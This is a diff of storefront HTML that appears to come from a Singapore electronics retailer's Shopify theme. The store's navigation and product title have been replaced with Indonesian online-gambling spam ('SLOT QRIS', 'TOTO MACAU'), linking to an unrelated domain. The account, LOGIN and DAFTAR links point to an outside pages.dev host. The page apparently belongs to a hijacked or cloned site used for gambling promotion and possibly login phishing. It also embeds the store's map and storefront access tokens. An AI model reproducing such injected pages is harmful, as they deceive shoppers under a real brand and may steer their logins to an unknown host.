+                                    d="M61.0338 11.8765H61.9914V12.6045H62.0136C62.2132 12.1132 62.6872 11.7871 63.299 11.7871C63.9419 11.7871 64.4116 12.122 64.598 12.7118H64.6202C64.8596 12.1402 65.4091 11.7871 66.0743 11.7871C66.9963 11.7871 67.5993 12.4034 67.5993 13.3457V16.5745H66.6373V13.5779C66.6373 12.9661 66.3133 12.6133 65.746 12.6133C65.1786 12.6133 64.784 13.042 64.784 13.6362V16.5748H63.8439V13.5065C63.8439 12.9617 63.5027 12.6133 62.9616 12.6133C62.3942 12.6133 61.9909 13.0643 61.9909 13.6717V16.5745H61.0333V11.8765H61.0338Z"
+                                    fill="#121212"></path>
+                                <path
+                                    d="M32.4756 19.6562H34.8561C36.1108 19.6562 36.9797 20.5045 36.9797 21.7685V21.7773C36.9797 23.0366 36.1108 23.8986 34.8561 23.8986H33.4686V26.1002H32.4756V19.6562ZM33.4686 20.5004V23.0592H34.608C35.4725 23.0592 35.9689 22.5902 35.9689 21.782V21.7732C35.9689 20.969 35.4728 20.5004 34.608 20.5004H33.4686Z"
+                                    fill="#121212"></path>
+                                <path
+                                    d="M37.4825 24.7629V24.754C37.4825 23.9367 38.112 23.4365 39.2159 23.3695L40.4837 23.2937V22.9408C40.4837 22.4228 40.1513 22.11 39.5571 22.11C39.0031 22.11 38.6613 22.3737 38.5817 22.7486L38.5729 22.7888H37.6684L37.6728 22.7397C37.7393 21.9312 38.4354 21.3105 39.5839 21.3105C40.723 21.3105 41.4457 21.918 41.4457 22.8603V26.0983H40.4837V25.3568H40.4662C40.1956 25.8613 39.6548 26.1829 39.0384 26.1829C38.1076 26.1832 37.4825 25.607 37.4825 24.7629ZM39.3002 25.4106C39.9738 25.4106 40.4837 24.9504 40.4837 24.3386V23.9725L39.3443 24.044C38.7681 24.0796 38.4488 24.3342 38.4488 24.7317V24.7405C38.4491 25.1515 38.7859 25.4106 39.3002 25.4106Z"
+                                    fill="#121212"></path>
+                                <path
+                                    d="M42.5538 21.4038H43.5114V22.2077H43.5335C43.6842 21.6584 44.0744 21.3145 44.6064 21.3145C44.7436 21.3145 44.8633 21.3368 44.9389 21.3503V22.2479C44.8636 22.2168 44.6949 22.1944 44.5089 22.1944C43.8925 22.1944 43.5114 22.6008 43.5114 23.302V26.1019H42.5538V21.4038Z"
+                                    fill="#121212"></path>
+                                <path
+                                    d="M46.3461 24.8628V22.1697H45.6768V21.4017H46.3461V20.1777H47.3258V21.4017H48.1991V22.1697H47.3258V24.8046C47.3258 25.2824 47.5386 25.4253 47.942 25.4253C48.0441 25.4253 48.1285 25.4165 48.1991 25.4076V26.1536C48.0882 26.1712 47.9067 26.1938 47.7114 26.1938C46.7894 26.1936 46.3461 25.8005 46.3461 24.8628Z"
+                                    fill="#121212"></path>
+                                <path
+                                    d="M49.2159 21.4038H50.1735V22.1136H50.1957C50.4394 21.6361 50.9183 21.3145 51.6232 21.3145C52.647 21.3145 53.2369 21.9798 53.2369 23.0606V26.1019H52.2749V23.2438C52.2749 22.5379 51.9468 22.1406 51.2817 22.1406C50.6078 22.1406 50.1735 22.6319 50.1735 23.3643V26.1022H49.2159V21.4038Z"
+                                    fill="#121212"></path>
+                                <path
+                                    d="M54.1758 23.767V23.7623C54.1758 22.2931 55.0182 21.3105 56.326 21.3105C57.6338 21.3105 58.4362 22.2576 58.4362 23.6685V23.9946H55.1334C55.151 24.8834 55.6343 25.4017 56.3966 25.4017C56.964 25.4017 57.3408 25.1068 57.4608 24.754L57.4742 24.7182H58.3828L58.374 24.7673C58.2234 25.5132 57.5051 26.1921 56.3745 26.1921C55.005 26.1921 54.1758 25.2497 54.1758 23.767ZM55.1466 23.3116H57.4876C57.4076 22.4989 56.9555 22.1011 56.3304 22.1011C55.7099 22.1011 55.2309 22.5254 55.1466 23.3116Z"
+                                    fill="#121212"></path>
+                                <path
+                                    d="M59.4498 21.4038H60.4074V22.2077H60.4295C60.5802 21.6584 60.9704 21.3145 61.5024 21.3145C61.6396 21.3145 61.7593 21.3368 61.8349 21.3503V22.2479C61.7596 22.2168 61.5909 22.1944 61.4049 22.1944C60.7885 22.1944 60.4074 22.6008 60.4074 23.302V26.1019H59.4498V21.4038Z"
+                                    fill="#121212"></path>
+                            </svg>
+                        </a>
+                    </div>
+                </div>
+                <div class="search-container">
+
+                    <div class="container_search container_search_port"><predictive-search class="search-modal__form"
+                            data-loading-text="Loading...">
+                            <form class="nosubmit_form search search-modal__form" action="/search" id="nosubmit_form2"
+                                method="get" role="search"><input type="hidden" name="type" value="product">
+                                <input class="nosubmit" id="Search-In-Modal" type="search" name="q" value=""
+                                    placeholder="Search" aria-label="Search" role="combobox" aria-expanded="false"
+                                    aria-owns="predictive-search-results-list"
+                                    aria-controls="predictive-search-results-list" aria-haspopup="listbox"
+                                    aria-autocomplete="list" autocorrect="off" autocomplete="off" autocapitalize="off"
+                                    spellcheck="false">
+                                <div class="predictive-search predictive-search--header" tabindex="-1"
+                                    data-predictive-search style="max-height: 540px;">
+                                    <div class="predictive-search__loading-state">
+                                        <svg aria-hidden="true" focusable="false" role="presentation" class="spinner"
+                                            viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">
+                                            <circle class="path" fill="none" stroke-width="6" cx="33" cy="33" r="30">
+                                            </circle>
+                                        </svg>
+                                    </div>
+                                </div>
+                                <span class="predictive-search-status visually-hidden" role="status"
+                                    aria-hidden="true"></span>
+                            </form>
+                            <button type="button" class="btn_close btn_close_desktop" id="btn_close2"
+                                aria-label="Close">
+                                <svg class="icon icon-close" aria-hidden="true" focusable="false" role="presentation"
+                                    width="16.61px" height="16.61px">
+                                    <use href="#icon-close" />
+                                </svg>
+                            </button>
+                        </predictive-search></div>
+
+                </div>
+                <link href="/" rel="stylesheet" type="text/css" media="all" />
+                <my-store-locator class="no-js-hidden my-store-locator" data-limit-search-to-countries="us"
+                    data-storefront-api-access-token="962d1ff668df08fb12a218f6d7553a2e"
+                    data-default-location-id="94099734846" data-number-of-locations-to-fetch="24"
+                    data-apple-maps-access-token="eyJraWQiOiI1SDZEQlAyR0E1IiwidHlwIjoiSldUIiwiYWxnIjoiRVMyNTYifQ.eyJpc3MiOiI0Njg5NkZRSFgyIiwiaWF0IjoxNzQ2NzYyMDY2LCJvcmlnaW4iOiJ3d3cuaXN0dWRpb3NnLmNvbSJ9.auAkvVIPCaY73yQjcammRk6DID4vJpijWzhB2kWfOzLtcEclmavkBRAn7eEViSvLKVRt45zmNjODWadyzmProg"
+                    data-distance-unit="miles" data-distance-miles-label="miles" data-distance-km-label="km"
+                    data-error-text="Error: Try again" data-select-text="Select your store"
+                    data-low-stock-html="Only {{ quantity }} left" data-unavailable-text="Unavailable"
+                    data-view-store-availability-text="View store availability" data-loading-text="Loading store">
+                    <button class="js-my-store-locator-btn my-store-locator__btn" disabled aria-haspopup="dialog">
+                        <div class="my-store-locator__icon">
+                            <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="16"
+                                height="14" viewBox="0 0 16 14" fill="none">
+                                <path
+                                    d="M12.7742 13.3755H3.05191C2.2285 13.3755 1.55871 12.7056 1.55871 11.8822L1.55859 5.46973H2.29228V11.8822C2.29228 12.301 2.63304 12.6417 3.0518 12.6417H12.7743C13.1931 12.6417 13.5338 12.3011 13.5338 11.8822L13.534 5.46973H14.2676V11.8822C14.2676 12.7056 13.5977 13.3755 12.7743 13.3755H12.7742Z"
+                                    fill="#1D1D1F" />
+                                <path
+                                    d="M6.19597 6.04216C5.04487 6.04216 4.1084 5.10557 4.1084 3.95459H4.84209C4.84209 4.70103 5.44941 5.30836 6.19597 5.30836C6.94253 5.30836 7.54985 4.70103 7.54985 3.95459H8.28354C8.28354 5.10557 7.34707 6.04216 6.19597 6.04216Z"
+                                    fill="#1D1D1F" />
+                                <path
+                                    d="M9.63738 6.04397C8.48628 6.04397 7.5498 5.10738 7.5498 3.95639V2.43213H8.28349V3.95639C8.28349 4.70284 8.89082 5.31016 9.63738 5.31016C10.3839 5.31016 10.9913 4.70284 10.9913 3.95639H11.7249C11.7249 5.10738 10.7885 6.04397 9.63738 6.04397Z"
+                                    fill="#1D1D1F" />
+                                <path
+                                    d="M13.0793 6.04286C11.9282 6.04286 10.9917 5.10627 10.9917 3.95529V2.43102H11.7254V3.95529C11.7254 4.70173 12.3327 5.30906 13.0793 5.30906C13.8258 5.30906 14.4333 4.70173 14.4333 3.95529V2.54174L13.231 0.73392H2.60295L1.40068 2.54163V3.95517C1.40068 4.70162 2.00812 5.30894 2.75468 5.30894C3.50124 5.30894 4.10856 4.70162 4.10856 3.95517V2.43091H4.84225V3.95517C4.84225 5.10627 3.90578 6.04275 2.75468 6.04275C1.60347 6.04275 0.666992 5.10616 0.666992 3.95517V2.43091C0.666992 2.35862 0.688332 2.2879 0.728328 2.22768L2.10075 0.16379C2.16868 0.0614505 2.28342 0 2.40621 0H13.4275C13.5503 0 13.6651 0.0614477 13.733 0.16379L15.1057 2.22779C15.1458 2.28802 15.167 2.35874 15.167 2.43102V3.95529C15.167 5.10627 14.2305 6.04286 13.0793 6.04286H13.0793Z"
+                                    fill="#1D1D1F" />
+                                <path d="M1.0332 2.06055H14.7997V2.79435H1.0332V2.06055Z" fill="#1D1D1F" />
+                                <rect x="5.4806" y="8.38246" width="4.63549" height="4.63549" rx="0.534864"
+                                    stroke="black" stroke-width="0.713153" />
+                            </svg>
+                        </div>
+                        <p class="js-my-store-locator-info my-store-locator__info">
+                            Loading store
+                            <i class="fa fa-spinner fa-spin"></i>
+                        </p>
+                    </button>
+                    <div class="js-my-store-locator-details my-store-locator__details" tabindex="-1" role="dialog"
+                        aria-modal="true" aria-labelledby="MyStoreDetailsHeading">
+                        <button class="js-my-store-locator-close my-store-locator__close" type="button"
+                            aria-label="Close">
+
+
+                            <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"
+                                class="icon icon-close" fill="none" viewBox="0 0 18 17" width="18" height="17">
+                                <path
+                                    d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z"
+                                    fill="currentColor">
+                            </svg>
+                        </button>
+                        <div class="my-store-locator__details-header">
+                            <h2 class="my-store-locator__details-title" id="MyStoreDetailsHeading"></h2>
+                            <span class="js-my-store-locator-distance my-store-locator__details-distance hidden">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </span>
+                        </div>
+                        <div class="js-my-store-locator-location my-store-locator__details-location"></div>
+                        <div class="my-store-locator-content">
+                            <div class="js-my-store-locator-address my-store-locator__details-info hidden">
+                                Address: <a href="#" target="_blank"></a>
+                            </div>
+                            <div class="js-my-store-locator-telephone my-store-locator__details-info hidden">
+                                Telephone: <a href="#"></a>
+                            </div>
+                            <div class="js-my-store-locator-email my-store-locator__details-info hidden">
+                                Email: <a href="#" target="_blank"></a>
+                            </div>
+                            <div class="js-my-store-locator-hours my-store-locator__details-info hidden">
+                                Hours: <span></span>
+                            </div>
+                            <div class="js-my-store-locator-services hidden"></div>
+                        </div>
+                        <div class="my-store-locator__details-footer"><a
+                                class="my-store-locator__details-btn--secondary button button--secondary button--full-width"
+                                href="/">
+                                View store map
+                            </a><button
+                                class="js-my-store-locator-drawer-btn my-store-locator__details-btn button button--full-width"
+                                aria-haspopup="dialog">
+                                Select another store
+                            </button>
+                        </div>
+                    </div>
+                </my-store-locator>
+                <script
+                    src="//www.istudiosg.com/cdn/shop/t/14/assets/my-store-locator.js?v=142963705601107651211749103666"
+                    defer="defer"></script>
+
+                <script>
+                    SDG.Data.mapsToken = "eyJraWQiOiI1SDZEQlAyR0E1IiwidHlwIjoiSldUIiwiYWxnIjoiRVMyNTYifQ.eyJpc3MiOiI0Njg5NkZRSFgyIiwiaWF0IjoxNzQ2NzYyMDY2LCJvcmlnaW4iOiJ3d3cuaXN0dWRpb3NnLmNvbSJ9.auAkvVIPCaY73yQjcammRk6DID4vJpijWzhB2kWfOzLtcEclmavkBRAn7eEViSvLKVRt45zmNjODWadyzmProg";
+                    SDG.Data.googleMapsToken = "";
+                    SDG.Data.mapProvider = "apple_maps";
+
+                    SDG.Data.mapPage = false;
+
+                    SDG.Data.storeServiceTrigger = 'View store services';
+                    SDG.Data.storeHours = 'Hours';
+                    SDG.Data.storeAddress = 'Address';
+                    SDG.Data.storeEmail = 'Email';
+                    SDG.Data.storePhone = 'Telephone';
+                    SDG.Data.myStore = 'My store';
+                    SDG.Data.makeThisMyStore = 'Make this my store';
+                    SDG.Data.shopCountry = 'Singapore';
+                </script>
+                <script src="//www.istudiosg.com/cdn/shop/t/14/assets/mapkit.js?v=2554415917941391361742784889"
+                    defer></script>
+                <script async>
+                    document?.addEventListener('DOMContentLoaded', function () {
+                        if (window?.mapkit) {
+                            mapkit.init({
+                                authorizationCallback: function (done) {
+                                    done("eyJraWQiOiI1SDZEQlAyR0E1IiwidHlwIjoiSldUIiwiYWxnIjoiRVMyNTYifQ.eyJpc3MiOiI0Njg5NkZRSFgyIiwiaWF0IjoxNzQ2NzYyMDY2LCJvcmlnaW4iOiJ3d3cuaXN0dWRpb3NnLmNvbSJ9.auAkvVIPCaY73yQjcammRk6DID4vJpijWzhB2kWfOzLtcEclmavkBRAn7eEViSvLKVRt45zmNjODWadyzmProg");
+                                },
+                                language: 'en',
+                            });
+                        }
+
+                        if (window?.google) {
+                            google.maps.importLibrary('geocoding');
+                            google.maps.importLibrary('places');
+                        }
+                    });
+                </script>
+                <div class="header__icons">
+                    <div class="desktop-localization-wrapper">
+                    </div>
+                    <a href="https://qrisni0day7.pages.dev/"
+                        class="header__icon header__icon--account link focus-inset small-hide">
+                        <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"
+                            class="icon icon-account" fill="none" viewBox="0 0 18 19" width="18" height="19">
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                d="M6 4.5a3 3 0 116 0 3 3 0 01-6 0zm3-4a4 4 0 100 8 4 4 0 000-8zm5.58 12.15c1.12.82 1.83 2.24 1.91 4.85H1.51c.08-2.6.79-4.03 1.9-4.85C4.66 11.75 6.5 11.5 9 11.5s4.35.26 5.58 1.15zM9 10.5c-2.5 0-4.65.24-6.17 1.35C1.27 12.98.5 14.93.5 18v.5h17V18c0-3.07-.77-5.02-2.33-6.15-1.52-1.1-3.67-1.35-6.17-1.35z"
+                                fill="currentColor">
+                        </svg>
+
+                        <span class="visually-hidden">Log in</span>
+                    </a>
+
+
+                </div>
+            </header>
+
+
+            <div class="header_nav">
+
+
+                <br>
+
+                <lazyload-section data-selectors='[".js-header-dropdown-menu-list"]'>
+                    <nav class="header__inline-menu">
+                        <ul class="list-menu list-menu--inline">
+                            <li>
+                                <header-menu>
+                                    <details id="Details-HeaderMenu-1" class="mainMenuUpdate2">
+                                        <summary id="headerCss HeaderMenu-mac"
+                                            class="header__menu-item list-menu__item link focus-inset">
+                                            <span>
+
+
+                                                <a href="https://tunari-online.ro/">SLOT</a>
+
+
+                                            </span>
+                                            <svg aria-hidden="true" focusable="false" class="icon icon-caret"
+                                                viewBox="0 0 10 6">
+                                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                                    d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                    fill="currentColor">
+                                            </svg>
+
+                                        </summary>
+                                        <ul id="HeaderMenu-MenuList-1"
+                                            class="js-header-dropdown-menu-list header__submenu list-menu list-menu--disclosure color-background-1 gradient caption-large motion-reduce global-settings-popup"
+                                            tabindex="-1"></ul>
+                                    </details>
+                                </header-menu>
+                            </li>
+                            <li><header-menu>
+                                    <details id="Details-HeaderMenu-2" class="mainMenuUpdate2">
+                                        <summary id="headerCss HeaderMenu-ipad"
+                                            class="header__menu-item list-menu__item link focus-inset">
+                                            <span>
+
+
+                                                <a href="https://tunari-online.ro/">DATA MACAU</a>
+
+
+                                            </span>
+                                            <svg aria-hidden="true" focusable="false" class="icon icon-caret"
+                                                viewBox="0 0 10 6">
+                                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                                    d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                    fill="currentColor">
+                                            </svg>
+
+                                        </summary>
+                                        <ul id="HeaderMenu-MenuList-2"
+                                            class="js-header-dropdown-menu-list header__submenu list-menu list-menu--disclosure color-background-1 gradient caption-large motion-reduce global-settings-popup"
+                                            tabindex="-1"></ul>
+                                    </details>
+                                </header-menu></li>
+                            <li><header-menu>
+                                    <details id="Details-HeaderMenu-3" class="mainMenuUpdate2">
+                                        <summary id="headerCss HeaderMenu-iphone"
+                                            class="header__menu-item list-menu__item link focus-inset">
+                                            <span>
+
+
+                                                <a href="https://tunari-online.ro/">TOTO MACAU</a>
+
+
+                                            </span>
+                                            <svg aria-hidden="true" focusable="false" class="icon icon-caret"
+                                                viewBox="0 0 10 6">
+                                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                                    d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                    fill="currentColor">
+                                            </svg>
+
+                                        </summary>
+                                        <ul id="HeaderMenu-MenuList-3"
+                                            class="js-header-dropdown-menu-list header__submenu list-menu list-menu--disclosure color-background-1 gradient caption-large motion-reduce global-settings-popup"
+                                            tabindex="-1"></ul>
+                                    </details>
+                                </header-menu></li>
+                            <li><header-menu>
+                                    <details id="Details-HeaderMenu-4" class="mainMenuUpdate2">
+                                        <summary id="headerCss HeaderMenu-watch"
+                                            class="header__menu-item list-menu__item link focus-inset">
+                                            <span>
+
+
+                                                <a href="https://tunari-online.ro/">RESULT MACAU</a>
+
+
+                                            </span>
+                                            <svg aria-hidden="true" focusable="false" class="icon icon-caret"
+                                                viewBox="0 0 10 6">
+                                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                                    d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                    fill="currentColor">
+                                            </svg>
+
+                                        </summary>
+                                        <ul id="HeaderMenu-MenuList-4"
+                                            class="js-header-dropdown-menu-list header__submenu list-menu list-menu--disclosure color-background-1 gradient caption-large motion-reduce global-settings-popup"
+                                            tabindex="-1"></ul>
+                                    </details>
+                                </header-menu></li>
+                            <li><header-menu>
+                                    <details id="Details-HeaderMenu-5" class="mainMenuUpdate2">
+                                        <summary id="headerCss HeaderMenu-music"
+                                            class="header__menu-item list-menu__item link focus-inset">
+                                            <span>
+
+
+                                                <a href="https://tunari-online.ro/">LIVEDRAW MACAU</a>
+
+
+                                            </span>
+                                            <svg aria-hidden="true" focusable="false" class="icon icon-caret"
+                                                viewBox="0 0 10 6">
+                                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                                    d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                    fill="currentColor">
+                                            </svg>
+
+                                        </summary>
+                                        <ul id="HeaderMenu-MenuList-5"
+                                            class="js-header-dropdown-menu-list header__submenu list-menu list-menu--disclosure color-background-1 gradient caption-large motion-reduce global-settings-popup"
+                                            tabindex="-1"></ul>
+                                    </details>
+                                </header-menu></li>
+                            <li><header-menu>
+                                    <details id="Details-HeaderMenu-6" class="mainMenuUpdate2">
+                                        <summary id="headerCss HeaderMenu-tv-home"
+                                            class="header__menu-item list-menu__item link focus-inset">
+                                            <span>
+
+
+                                                <a href="https://tunari-online.ro/">KELUARAN MACAU</a>
+
+
+                                            </span>
+                                            <svg aria-hidden="true" focusable="false" class="icon icon-caret"
+                                                viewBox="0 0 10 6">
+                                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                                    d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                    fill="currentColor">
+                                            </svg>
+
+                                        </summary>
+                                        <ul id="HeaderMenu-MenuList-6"
+                                            class="js-header-dropdown-menu-list header__submenu list-menu list-menu--disclosure color-background-1 gradient caption-large motion-reduce global-settings-popup"
+                                            tabindex="-1"></ul>
+                                    </details>
+                                </header-menu></li>
+
+                            <li><header-menu>
+                                    <details id="Details-HeaderMenu-8" class="mainMenuUpdate2">
+                                        <summary id="headerCss HeaderMenu-services"
+                                            class="header__menu-item list-menu__item link focus-inset">
+                                            <span>
+
+
+                                                <a href="https://tunari-online.ro/">BANDAR TOTO MACAU</a>
+
+
+                                            </span>
+                                            <svg aria-hidden="true" focusable="false" class="icon icon-caret"
+                                                viewBox="0 0 10 6">
+                                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                                    d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                    fill="currentColor">
+                                            </svg>
+
+                                        </summary>
+                                        <ul id="HeaderMenu-MenuList-7"
+                                            class="js-header-dropdown-menu-list header__submenu list-menu list-menu--disclosure color-background-1 gradient caption-large motion-reduce global-settings-popup"
+                                            tabindex="-1"></ul>
+                                    </details>
+                                </header-menu></li>
+
+                    </nav>
+                </lazyload-section>
             </div>
+        </sticky-header>
+
+        <link href="//www.istudiosg.com/cdn/shop/t/14/assets/custom-style.css?v=128650136086380557481742784888"
+            rel="stylesheet" type="text/css" media="all" />
+
+        <lazyload-section data-render-on-load="true" data-selector="cart-notification"></lazyload-section>
+        <style>
+            .cart-notification {
+                display: none;
+            }
+        </style>
+
+
+
+        <script>
+            $("input").focus(function () {
+                $(".btn_close").css("visibility", "visible");
+            });
+            $(".btn_close").on("mousedown ", function () {
+                $(".nosubmit").val("");
+            });
+            $("input").focusout(function () {
+                $(".btn_close").css("visibility", "hidden");
+            });
+            $("input").focus(function () {
+                if (document.querySelector('.gl-fullscreen-header') !== null) {
+                    $(".btn_close").css("visibility", "hidden");
+                }
+            });
+            $("#Details-menu-drawer-container").on("click", function () {
+                if ($("#cart-notification").hasClass("minicart-active")) {
+                    $("#cart-notification").hide();
+                    $('#cart-notification').removeClass('minicart-active');
+                }
+            });
+            $('body,html').click(function (e) {
+                if ($("#cart-notification").hasClass("minicart-active")) {
+                    $("#cart-notification").hide();
+                    $('#cart-notification').removeClass('minicart-active');
+                }
+            });
+        </script>
+    </div>
+
+
+    <style>
+        input.nosubmit {
+
+            background-color: #000000 !important;
+        }
+
+        .header_nav {
+
+            background-color: #969696;
+        }
+
+        .header-wrapper--border-bottom {
+
+            background: #000000 !important;
+        }
+
+        @media screen and (min-width: 1024px) {
+            .header_nav {
+                width: 100%;
+                max-width: 1220px;
+                margin: 0 auto;
+                padding: 0;
+                background: black;
+            }
+        }
+
+        a:link,
+        a:visited {
+            color: gold;
+            outline: none;
+            text-decoration: none;
+        }
+
+        .focus-none {
+            box-shadow: none !important;
+            outline: 0 !important;
+            background: rgb(0, 0, 0);
+        }
+
+        .social_media {
+            background: linear-gradient(to bottom, #c20007 0%, #9a0000 50%, #750000 100%);
+            border-radius: 20px;
+            border: 2px solid #ffffff;
+        }
+
+        .share-button__button .icon-share {
+            height: 1.2rem;
+            margin-right: 1rem;
+            min-width: 1.3rem;
+            background: #ffffff;
+        }
+
+        .quantity {
+            padding: 8px !important;
+            width: 144px;
+            height: 44px !important;
+            left: 0;
+            top: 0;
+            border: 5px solid #ffd000;
+
+        }
+
+        body {
+            background-color: #000000 !important;
+        }
+
+        @media screen and (min-width: 750px) {
+            .footer {
+                margin-top: 24px;
+                background: rgb(0, 0, 0);
+            }
+        }
+
+        .footer-block__heading {
+            color: #ffd900 !important;
+        }
+
+        @media screen and (min-width: 750px) {
+            .footer-block__details-content>:first-child .list-menu__item--link {
+                color: #ffffff !important;
+            }
+        }
+
+        .footer-block__details-content .list-menu__item--link,
+        .copyright__content a {
+            color: #ffffff !important;
+        }
+
+        @media screen and (min-width: 769px) {
+            .footer-block__heading2 {
+                color: azure;
+            }
+        }
+
+        .copyright__content {
+            font-size: 1.1rem;
+            color: #ffffff;
+        }
+
+        input.nosubmit {
+            border: 2px solid yellow !important;
+            background: #ff9900;
+            border-radius: 32px;
+            height: 36px;
+            width: 440px;
+        }
+
+
+        .n-columns-2 {
+            width: 100vw;
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            font-weight: 700;
+        }
+
+        .n-columns-2 a {
+            text-align: center;
+        }
+
+        .login,
+        .register {
+            color: rgb(255, 255, 255);
+            padding: 5px 10px;
+        }
+
+        .login,
+        .login-button {
+            background: linear-gradient(to bottom, #ff0800 0%, #a5290d 50%, #ff6600 100%);
+            border: 1px solid #000000;
+        }
+
+        .register,
+        .register-button {
+            background: linear-gradient(to bottom, #ff6600 0%, #a5290d 50%, #ff0800 100%);
+            border: 1px solid #000000;
+        }
+    </style>
+    <div class="n-columns-2" style="font-size: 20px;"><a
+            href="https://qrisni0day7.pages.dev/" rel="nofollow noreferrer"
+            class="login" style="color: #ffffff;">LOGIN</a> <a href="https://qrisni0day7.pages.dev/" rel="nofollow noreferrer"
+            class="register" style="color: #ffffff;">DAFTAR</a> </div>
+
+
+
+    <!-- END sections: header-group -->
+    <main id="MainContent" class="content-for-layout focus-none" role="main" tabindex="-1">
+
+
+
+        <section id="shopify-section-template--17605519376564__main" class="shopify-section section">
+
+
+            <section id="MainProduct-template--17605519376564__main"
+                class="product-page-width page-width section-template--17605519376564__main-padding"
+                data-section="template--17605519376564__main">
+                <link
+                    href="//www.istudiosg.com/cdn/shop/t/14/assets/section-main-product.css?v=106354761565452021941742784887"
+                    rel="stylesheet" type="text/css" media="all" />
+                <link
+                    href="//www.istudiosg.com/cdn/shop/t/14/assets/component-accordion.css?v=114305622551526091581742784887"
+                    rel="stylesheet" type="text/css" media="all" />
+                <link
+                    href="//www.istudiosg.com/cdn/shop/t/14/assets/component-price.css?v=89212854351592844731742784887"
+                    rel="stylesheet" type="text/css" media="all" />
+                <link
+                    href="//www.istudiosg.com/cdn/shop/t/14/assets/component-slider.css?v=102975581670085299341742784888"
+                    rel="stylesheet" type="text/css" media="all" />
+                <link
+                    href="//www.istudiosg.com/cdn/shop/t/14/assets/component-rating.css?v=157771854592137137841742784889"
+                    rel="stylesheet" type="text/css" media="all" />
+                <link
+                    href="//www.istudiosg.com/cdn/shop/t/14/assets/component-loading-overlay.css?v=160031540023746741091742784889"
+                    rel="stylesheet" type="text/css" media="all" />
+                <link
+                    href="//www.istudiosg.com/cdn/shop/t/14/assets/component-deferred-media.css?v=14096082462203297471742784888"
+                    rel="stylesheet" type="text/css" media="all" />
+                <link href="//www.istudiosg.com/cdn/shop/t/14/assets/custom-style.css?v=128650136086380557481742784888"
+                    rel="stylesheet" type="text/css" media="all" />
+                <link href="//www.istudiosg.com/cdn/shop/t/14/assets/collapsecon.css?v=55192844502193137581742784889"
+                    rel="stylesheet" type="text/css" media="all" />
+                <link
+                    href="//www.istudiosg.com/cdn/shop/t/14/assets/productMarketingContent.css?v=134348870364535945721742784887"
+                    rel="stylesheet" type="text/css" media="all" />
+                <link href="//www.istudiosg.com/cdn/shop/t/14/assets/fancybox-3-5-7.css?v=48221248546321444771742784887"
+                    rel="stylesheet" type="text/css" media="all" />
+
+                <link
+                    href="//www.istudiosg.com/cdn/shop/t/14/assets/component-trade-in-sellto.css?v=107184028641227493051757586003"
+                    rel="stylesheet" type="text/css" media="all" />
+                <link
+                    href="//www.istudiosg.com/cdn/shop/t/14/assets/component-trade-in-dialog.css?v=16175248172835987831757430081"
+                    rel="stylesheet" type="text/css" media="all" />
+                <style data-shopify>
+                    .section-template--17605519376564__main-padding {
+                        padding-top: 27px;
+                        padding-bottom: 9px;
+                    }
+
+                    @media screen and (min-width: 750px) {
+                        .section-template--17605519376564__main-padding {
+                            padding-top: 36px;
+                            padding-bottom: 12px;
+                        }
+                    }
+                </style>
+
+                <script
+                    src="//www.istudiosg.com/cdn/shop/t/14/assets/google_analytics_finacing.js?v=123767470501580560631742784889"
+                    defer="defer"></script>
+
+
+                <script src="//www.istudiosg.com/cdn/shop/t/14/assets/product-info.js?v=68469288658591082901742784888"
+                    defer="defer"></script>
+
+
+                <div
+                    class="product product--large product--left product--stacked product--mobile-hide grid grid--1-col grid--2-col-tablet">
+
+
+                    <div class="product-page-width mobile-view_product-title">
+
+                        <div class="priceAndLabelTag">
+                            <div class="product_tag_display_container">
+
+
+
+
+                                <span class="product_tag_display" style="color:#ff9900;">NEW</span>
+
+
+                            </div>
+                        </div>
+
+                        <div class="product-title-style product__title">
+                            <h1 style="color: #ffd900;">SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI</h1>
+
+                        </div>
+                    </div>
+
+
+                    <div class="grid__item product__media-wrapper">
+
+                        <media-gallery id="MediaGallery-template--17605519376564__main" role="region"
+                            class="product__media-gallery product-custom-media" aria-label="Gallery Viewer"
+                            data-desktop-layout="stacked">
+                            <div id="GalleryStatus-template--17605519376564__main" class="visually-hidden"
+                                role="status"></div>
+                            <slider-component id="GalleryViewer-template--17605519376564__main"
+                                class="slider-mobile-gutter"><a
+                                    class="skip-to-content-link button visually-hidden quick-add-hidden"
+                                    href="#ProductInfo-template--17605519376564__main">
+                                    Skip to product information
+                                </a>
